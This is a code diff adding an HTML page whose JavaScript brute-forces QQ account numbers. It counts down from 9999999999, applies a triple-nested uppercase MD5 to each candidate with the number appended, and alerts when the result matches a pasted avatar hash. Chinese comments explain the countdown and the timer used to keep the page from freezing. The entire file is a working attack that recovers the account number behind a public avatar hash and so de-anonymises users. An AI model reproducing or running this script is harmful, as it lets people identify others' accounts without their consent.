@@ -1,0 +1,24 @@
+<html>
+<head>
+<script src="https://cdn.bootcss.com/blueimp-md5/2.11.0/js/md5.min.js"></script>
+</head>
+<body>
+</body>
+<script>
+
+var x=9999999999;//起始的QQ号，计算是向下递减的
+function calc(){
+	var i=0;
+	for(;i<100000;i++){
+		var qq=x-i;
+if(md5(md5(md5(qq+"").toUpperCase()+qq).toUpperCase()+qq).toUpperCase()=="你的QQ头像hash"){
+			alert(qq);
+		}
+	}
+	x=x-i;
+	document.write(x+"<br />");
+	setTimeout(calc,50);//用setTimeout防止网页卡死
+}
+calc();
+</script>
+</html>
